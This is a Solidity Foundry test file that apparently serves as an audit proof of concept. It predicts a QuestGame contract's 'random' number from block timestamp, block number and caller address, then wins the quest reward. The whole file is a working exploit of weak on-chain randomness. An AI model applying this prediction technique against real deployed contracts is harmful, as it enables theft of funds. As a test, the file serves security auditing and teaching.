
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {
    QuestGame quest;

    function setUp() public {
        quest = new QuestGame{value: 10 ether}();
    }

    function test_highlightPredictableRandomValue(
        uint256 blockTimestamp,
        uint256 blockNumber,
        uint256 userGuessSalt
    ) public {
        vm.assume(blockTimestamp > 0 && blockTimestamp < type(uint64).max);
        vm.assume(blockNumber > 0 && blockNumber < type(uint64).max);

        vm.deal(address(this), 10 ether);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 predictedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(this)
                )
            )
        );
        uint256 predictedNumber = predictedSeed % 100;

        uint256 userGuess = uint256(keccak256(abi.encode(predictedNumber, userGuessSalt))) % 100;
        vm.assume(userGuess == predictedNumber);

        uint256 balanceBefore = address(this).balance;

        quest.attemptQuest{value: quest.ENTRY_FEE()}(userGuess);

        uint256 balanceAfter = address(this).balance;

        assertEq(balanceAfter, balanceBefore - quest.ENTRY_FEE() + quest.REWARD());
    }
}
